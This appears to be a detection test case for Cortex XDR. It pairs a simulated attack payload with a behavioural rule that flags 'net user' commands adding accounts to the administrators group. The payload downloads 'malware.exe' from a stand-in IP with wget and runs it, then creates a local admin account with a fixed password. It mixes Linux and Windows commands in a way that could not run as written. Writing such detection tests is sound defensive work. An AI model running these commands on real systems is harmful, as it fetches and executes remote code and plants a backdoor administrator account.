identity.description: An attacker uses the 'net user' command to create a new user account, which is flagged as uncommon behavior for a standard user. Cortex should detect this via process start telemetry and behavioral analysis.

payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/malware.exe http://192.0.2.5/malware.exe
chmod +x /tmp/scratch/malware.exe
/tmp/scratch/malware.exe
net user testuser P@ssw0rd /add
net localgroup administrators testuser /add

biocs.name: Uncommon user management via net command
biocs.description: Detection of net user command execution with administrative privileges
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'net.exe'
| filter action_command_line contains 'user'
| filter action_command_line contains '/add'
| filter action_command_line contains 'administrators'
